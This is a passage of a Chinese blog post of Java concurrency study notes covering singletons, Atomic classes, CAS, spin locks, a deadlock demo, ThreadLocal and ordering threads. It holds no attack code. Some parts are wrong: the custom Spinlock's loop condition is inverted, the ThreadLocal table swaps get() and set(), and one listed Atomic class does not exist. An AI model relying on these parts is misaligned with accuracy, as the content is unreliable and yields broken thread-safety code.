但是此时lazy还没有完成构造</span></span><br><span class="line"><span class="comment">                 因此需要用volatile</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="登记式-静态内部类"><a href="#登记式-静态内部类" class="headerlink" title="登记式/静态内部类"></a>登记式/静态内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lazy</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Lazy</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Lazy</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Lazy</span> <span class="params">()</span>&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Lazy <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Atomic-原子类"><a href="#Atomic-原子类" class="headerlink" title="Atomic 原子类"></a>Atomic 原子类</h1>CAS ：比较当前工作内存中的值和主内存的值，如果是期望的，就操作，否则就一直操作。</li></ul><p><strong>缺点：</strong></p><ul><li>自旋锁，会耗时</li><li>一次性只能保证一个共享变量的原子性</li><li>ABA问题<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareAndSetTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AtomicInteger</span> <span class="variable">atomicInteger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">2020</span>);</span><br><span class="line"><span class="comment">//如果是期望的值2020，则更新为2021，否则不更新</span></span><br><span class="line">        atomicInteger.compareAndSet(<span class="number">2020</span>,<span class="number">2021</span>);</span><br><span class="line"></span><br><span class="line">        atomicInteger.getAndIncrement();  <span class="comment">//+1</span></span><br><span class="line">        System.out.println(atomicInteger.get());   <span class="comment">//2022</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>底层是一个自旋锁</li></ul><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352248117-b31d1278-67ca-4c44-a13f-73c846324a56.png"></p><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352255758-3a137f8d-44df-4b24-b46f-f17ff62df08f.png"></p><ul><li><p>AtomicBoolean:  原子更新布尔类型。 </p></li><li><p>AtomicInteger:    原子更新整型。 </p></li><li><p>AtomicLong:       原子更新长整型。 </p></li><li><p>AtomicReference:  原子更新引用类型。 </p></li><li><p>AtomicReferenceFieldUpdater:  原子更新引用类型的字段。 </p></li><li><p>AtomicMarkableReferce:  原子更新带有标记位的引用类型，可以使用构造方法更新一个布尔类型的标记位和引用类型。 </p></li><li><p>AtomicIntegerFieldUpdater:  原子更新整型的字段的更新器。 </p></li><li><p>AtomicLongFieldUpdater:  原子更新长整型字段的更新器。 </p></li><li><p>AtomicStampedFieldUpdater:  原子更新带有版本号的引用类型。 </p><h1 id="各种锁的理解"><a href="#各种锁的理解" class="headerlink" title="各种锁的理解"></a>各种锁的理解</h1><h2 id="公平锁、非公平锁"><a href="#公平锁、非公平锁" class="headerlink" title="公平锁、非公平锁"></a>公平锁、非公平锁</h2><p>公平锁：非常公平，不能够插队，必须先来后到<br>非公平所：非常不公平，可以插队（默认都是非公平）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates an instance of &#123;<span class="doctag">@code</span> ReentrantLock&#125;.</span></span><br><span class="line"><span class="comment"> * This is equivalent to using &#123;<span class="doctag">@code</span> ReentrantLock(false)&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ReentrantLock</span><span class="params">()</span> &#123;</span><br><span class="line">    sync = <span class="keyword">new</span> <span class="title class_">NonfairSync</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可重入锁（递归锁）"><a href="#可重入锁（递归锁）" class="headerlink" title="可重入锁（递归锁）"></a>可重入锁（递归锁）</h2></li><li><p>synchronized锁</p></li></ul><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352333987-a31ffe5f-cbbc-4578-8e0e-422fd54cc580.png"></p><ul><li>Lock锁</li></ul><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352361385-3e7523d8-7d0e-433f-b17f-1d08a307ba21.png"></p><h2 id="自旋锁CAS"><a href="#自旋锁CAS" class="headerlink" title="自旋锁CAS"></a>自旋锁CAS</h2><p>之前AtomicInteger里又提到过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndAddInt</span><span class="params">(Object var1, <span class="type">long</span> var2, <span class="type">int</span> var4)</span> &#123;</span><br><span class="line">    <span class="type">int</span> var5;</span><br><span class="line">    <span class="comment">//这里的do while就是自旋锁</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        var5 = <span class="built_in">this</span>.getIntVolatile(var1, var2);</span><br><span class="line">    &#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.compareAndSwapInt(var1, var2, var5, var5 + var4));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自己写一个自旋锁"><a href="#自己写一个自旋锁" class="headerlink" title="自己写一个自旋锁"></a>自己写一个自旋锁</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Spinlock</span> &#123;</span><br><span class="line">    AtomicReference&lt;Thread&gt; atomicReference = <span class="keyword">new</span> <span class="title class_">AtomicReference</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;MyLock&quot;</span>);</span><br><span class="line">        <span class="comment">//自旋锁</span></span><br><span class="line">        <span class="keyword">while</span> (atomicReference.compareAndSet(<span class="literal">null</span>, thread)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myUnLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;MyUnLock&quot;</span>);</span><br><span class="line">        atomicReference.compareAndSet(thread, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657366256750-8375691e-0b1d-408d-b303-3617c9accc31.png"></p><p>多个线程同时被阻塞，它们中的一个或者全部都在等待某个资源被释放。由于线程被无限期地阻塞，因此程序不可能正常终止。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">resource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//资源 1</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">resource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//资源 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (resource1) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">&quot;get resource1&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">&quot;waiting get resource2&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (resource2) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread() + <span class="string">&quot;get resource2&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;线程 1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (resource2) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">&quot;get resource2&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">&quot;waiting get resource1&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (resource1) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread() + <span class="string">&quot;get resource1&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;线程 2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread[线程 <span class="number">1</span>,<span class="number">5</span>,main]get resource1</span><br><span class="line">Thread[线程 <span class="number">2</span>,<span class="number">5</span>,main]get resource2</span><br><span class="line">Thread[线程 <span class="number">1</span>,<span class="number">5</span>,main]waiting get resource2</span><br><span class="line">Thread[线程 <span class="number">2</span>,<span class="number">5</span>,main]waiting get resource1</span><br></pre></td></tr></table></figure><h2 id="死锁的四个必要条件"><a href="#死锁的四个必要条件" class="headerlink" title="死锁的四个必要条件"></a>死锁的四个必要条件</h2><ul><li><p><strong>互斥条件</strong>：一段时间内某个资源只能由一个线程占用</p></li><li><p><strong>请求和保持条件</strong>：线程至少保持了一个资源，但又提出了新的资源要求，该新资源被其他线程占有，此时请求阻塞，但又对自己持有的资源不放</p></li><li><p><strong>不剥夺条件</strong>：线程获得的资源在未释放以前不能被其他线程剥夺占有</p></li><li><p><strong>环路等待条件</strong>：发生死锁时，必然存在一个线程资源环形链，A等B，B等C，C等A。</p><h1 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h1></li><li><p>线程并发：在多线程并发场景下</p></li><li><p>传递数据：可以通过ThreadLocal在同一线程不同组件中传递公共变量</p></li><li><p>线程隔离：每个线程变量都是独立的，<strong>不会相互影响</strong></p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22222537/1657352460769-1cce4812-905a-4d40-86f7-e6722a6e0375.png#clientId=ue848bfe3-0a12-4&crop=0&crop=0&crop=1&crop=1&from=ui&id=u99528103&margin=%5Bobject%20Object%5D&name=image-20220622221402678.png&originHeight=692&originWidth=874&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160122&status=done&style=none&taskId=ubaf950be-af38-4fc8-a9a1-d2dfc17a257&title=" alt="image-20220622221402678.png"><br>JDK8优点：</p><ul><li>每个Map存储的Entry变少（避免hash冲突）</li><li>Thread销毁的时候，ThreadLocalMap也会随之销毁，减少内存的使用</li></ul><p>重要方法声明：</p><table><thead><tr><th><strong>方法声明</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>protected T initialValue()</td><td>返回当前线程局部变量的初始值</td></tr><tr><td>public T get()</td><td>设置当前线程绑定的局部变量</td></tr><tr><td>public void set(T value)</td><td>获取当前线程绑定的局部变量</td></tr><tr><td>public void remove()</td><td>移除当前线程绑定的局部变量</td></tr></tbody></table><h2 id="ThreadLocal中ThreadLocalMap数据结构和关系"><a href="#ThreadLocal中ThreadLocalMap数据结构和关系" class="headerlink" title="ThreadLocal中ThreadLocalMap数据结构和关系"></a>ThreadLocal中ThreadLocalMap数据结构和关系</h2><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352460769-1cce4812-905a-4d40-86f7-e6722a6e0375.png"></p><h2 id="ThreadLocal的key是弱引用，为什么"><a href="#ThreadLocal的key是弱引用，为什么" class="headerlink" title="ThreadLocal的key是弱引用，为什么"></a>ThreadLocal的key是弱引用，为什么</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22222537/1657352523979-72157845-6a68-4649-8e18-aabb06bc3509.png"></p><h1 id="如何保证线程的顺序执行"><a href="#如何保证线程的顺序执行" class="headerlink" title="如何保证线程的顺序执行"></a>如何保证线程的顺序执行</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FIFOThreadExample</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.print(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;B&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread1.join();</span><br><span class="line">        thread2.start();</span><br><span class="line">        thread2.join();</span><br><span class="line">        thread3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FIFOThreadExample</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.print(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;B&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newSingleThreadExecutor();</span><br><span class="line">        executor.submit(thread1);</span><br><span class="line">        executor.submit(thread2);</span><br><span class="line">        executor.submit(thread3);</span><br><span class="line">        executor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TicketExample2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//信号量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//线程休眠时间</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">SLEEP_TIME</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> name)</span>&#123;</span><br><span class="line">        <span class="comment">//因为线程的执行顺序是不可预期的，因此需要每个线程自旋</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket == name) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(SLEEP_TIME);</span><br><span class="line">                    <span class="comment">//每个线程循环打印3次</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">                        System.out.println(name + <span class="string">&quot; &quot;</span> + i);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//信号量变更</span></span><br><span class="line">                ticket = name%<span class="number">3</span>+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="number">1</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="number">2</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; foo(<span class="number">3</span>));</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">        thread3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TicketExample3</span> &#123;</span><br><span class="line">    <span class="comment">//信号量</span></span><br><span class="line">    <span class="type">AtomicInteger</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Condition</span> <span class="variable">condition1</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Condition</span> <span class="variable">condition2</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Condition</span> <span class="variable">condition3</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> Condition[] conditions = &#123;condition1, condition2, condition3&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> name)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="comment">//因为线程的执行顺序是不可预期的，因此需要每个线程自旋</span></span><br><span class="line">            System.out.println(<span class="string">&quot;线程&quot;</span> + name + <span class="string">&quot; 开始执行&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(ticket.get() != name) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;当前标识位为&quot;</span> + ticket.get() + <span class="string">&quot;,线程&quot;</span> + name + <span class="string">&quot; 开始等待&quot;</span>);</span><br><span class="line">                    <span class="comment">//开始等待被唤醒</span></span><br><span class="line">                    conditions[name - <span class="number">1</span>].await();</span><br><span class="line">                    System.out.println(<span class="string">&quot;线程&quot;</span> + name + <span class="string">&quot; 被唤醒&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">            ticket.getAndIncrement();</span><br><span class="line">            <span class="keyword">if</span> (ticket.get() &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                ticket.set(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//执行完毕，唤醒下一次。1唤醒2,2唤醒3</span></span><br><span class="line">            conditions[name % <span class="number">3</span>].signal();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//一定要释放锁</span></span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">TicketExample3</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TicketExample3</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            example.foo(<span class="number">1</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            example.foo(<span class="number">2</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span 